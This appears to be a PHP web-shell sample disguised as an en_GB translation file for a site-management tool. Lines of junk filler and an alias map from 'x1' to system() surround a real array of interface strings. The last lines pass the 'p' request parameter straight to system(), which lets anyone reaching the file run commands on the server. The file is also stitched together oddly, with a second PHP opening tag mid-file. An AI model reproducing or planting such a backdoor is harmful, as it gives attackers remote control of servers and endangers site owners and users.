<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
return ['domain'=>NULL,'plural-forms'=>'nplurals=2; plural=n != 1;','messages'=>['A password reset link will be sent to the user via email.'=>'A password reset link will be sent to the user via email.','If registration is disabled, please set %1$s in %2$s to a URL you will redirect visitors to if they visit a non-existent site.'=>'If registration is disabled, please set %1$s in %2$s to a URL you will redirect visitors to if they visit a non-existent site.','Site users list'=>'Site users list','Site users list navigation'=>'Site users list navigation','Sites list'=>'Sites list'],'language'=>'en_GB','x-generator'=>'Poedit 1.8.10'];
$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>